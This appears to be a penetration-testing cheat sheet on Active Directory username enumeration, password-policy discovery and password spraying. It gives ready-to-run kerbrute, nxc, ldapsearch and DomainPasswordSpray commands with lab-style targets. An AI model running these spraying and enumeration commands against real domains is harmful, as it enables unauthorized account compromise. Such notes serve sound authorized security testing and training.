- [ ] Username enumeration ([T1087.002 - Account Discovery](https://attack.mitre.org/techniques/T1087))
- [ ] Password Policy enumeration  ([T1201 - Password Policy Discovery](https://attack.mitre.org/techniques/T1201))
- [ ] Spray every protocols T1021.001, T1021.002, T1021.006
- [ ] Spray every protocols local-auth
## Linux
Enumerate protocol: [SMB & NetBIOS](../../Network%20Pentesting/Services/SMB%20%26%20NetBIOS.md)
- Kerbrute username enumeration 
```bash
kerbrute userenum --dc <IP> --domain <DOMAIN> <USERFILE>
```
- nxc username enumeration
```bash
nxc smb <IP> --users
```
- Password policy discovery
```bash
nxc smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
# OR
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```
- nxc
```bash
nxc smb targets.txt -u domain_users.txt -p domain_pass.txt --continue-on-success
nxc smb targets.txt -u domain_users.txt -p domain_pass.txt --continue-on-success --local-auth
```
- Kerbrute
```shell-session
kerbrute bruteuser -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```
## Windows
- Password policy discovery
```cmd
net accounts
```
- PowerView Password policy discovery
```cmd
Get-DomainPolicy
```
- DomainPasswordSpray.ps1
```powershell-session
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

